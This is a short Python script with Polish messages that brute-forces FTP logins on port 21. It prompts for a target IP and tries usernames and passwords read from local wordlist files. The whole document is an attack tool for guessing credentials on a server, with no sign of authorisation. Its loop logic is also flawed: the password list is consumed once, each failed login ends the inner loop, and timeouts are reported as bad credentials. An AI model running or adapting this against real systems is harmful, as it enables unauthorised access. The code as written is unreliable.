import ftplib

target_host = input("IP celu: ")
server = ftplib.FTP()
target_port = 21

users = open(r"C:\Users\wnerw\Desktop\user_list.txt")
passwords = open(r"C:\Users\wnerw\Desktop\password_list.txt")

authenticated = False

for user in users:
    user = user.replace("\n", "")
    try:
        for password in passwords:
            password = password.replace("\n", "")
            server.connect(target_host, target_port, timeout=2,)
            server.login(user, password)
            print("[+] Login udany przy userze: {} i haśle {} ".format(user, password))
            authenticated = True
            break
        if authenticated:
            break
    except Exception as error:
        if "timed out" in "{}".format(error):
            print("Nieprawidłowe credentiale.")
        else:
            print("{} -> {}".format(server.lastresp, error))
